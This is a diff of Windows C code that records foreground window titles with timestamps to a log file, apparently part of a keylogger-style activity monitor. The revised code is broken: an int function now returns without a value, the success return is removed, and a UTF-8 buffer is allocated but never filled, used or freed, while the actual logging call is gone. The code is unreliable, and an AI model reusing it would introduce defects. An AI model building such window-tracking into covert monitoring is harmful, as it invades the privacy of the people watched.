@@ -9,15 +9,11 @@ int	write_to_file(char *str)
 	if (fd == NULL)
 	{
 		printf("File handle is NULL\n");
-		return -1;
+		return ;
 	}
 	DWORD bytesWritten;
 	if (!WriteFile(fd, str, (DWORD)strlen(str), &bytesWritten, NULL))
-	{
 		printf("Failed to write to file: %lu\n", GetLastError());
-		return -1;
-	}
-	return 0;
 }
 
 char	*GetDateFormated(void)
@@ -44,42 +40,30 @@ char	*GetDateFormated(void)
 	return dateStr;
 }
 
-void CALLBACK WinForeground(HWINEVENTHOOK hWinEventHook, // Handle to the event hook
-	DWORD event, // Event type
-	HWND hwnd, // Handle to the window that generated the event
-	LONG idObject,	 // Object identifier
-	LONG idChild, // Child identifier
-	DWORD dwEventThread, // Thread identifier of the thread that generated the event
-	DWORD dwmsEventTime) // Time of the event in milliseconds since the system started
+void get_foreground_window(HWND hwnd)
 {
-	(void)hWinEventHook;
-	(void)idObject;
-	(void)idChild;
-	(void)dwEventThread;
-	(void)dwmsEventTime;
+	wchar_t windowTitleW[256];
+	if (GetWindowTextW(hwnd, windowTitleW, sizeof(windowTitleW) / sizeof(wchar_t)) == 0)
+		return;
 
-	if (event == EVENT_SYSTEM_FOREGROUND)
+	char *dateStr = GetDateFormated();
+	if (dateStr == NULL)
+		return;
+
+	int i = 0;
+	while (windowTitleW[i] != '\0' && i < 256 - 1)
 	{
-		char windowTitle[256];
-		if (GetWindowTextA(hwnd, windowTitle, sizeof(windowTitle)) == 0)
-			return;
+		if (windowTitleW[i] == '\r' || windowTitleW[i] == '\n')
+			windowTitleW[i] = ' ';
+		i++;
+	}
+	windowTitleW[i] = '\0';
 
-		char *dateStr = GetDateFormated();
-		if (dateStr == NULL)
-			return;
-
-		int i = 0;
-		while (windowTitle[i] != '\0' && i < 256 - 1)
-		{
-			if (windowTitle[i] == '\r' || windowTitle[i] == '\n')
-				windowTitle[i] = ' ';
-			i++;
-		}
-		windowTitle[i] = '\0';
-		char logEntry[512];
-		sprintf_s(logEntry, sizeof(logEntry), "\n[%s] - Foreground window title: %s\n", dateStr, windowTitle);
-		write_to_file(logEntry);
+	int utf8Len = WideCharToMultiByte(CP_UTF8, 0, windowTitleW, -1, NULL, 0, NULL, NULL);
+	char *windowTitleUtf8 = (char *)malloc(utf8Len);
+	if (!windowTitleUtf8) {
 		free(dateStr);
+		return;
 	}
 
 }
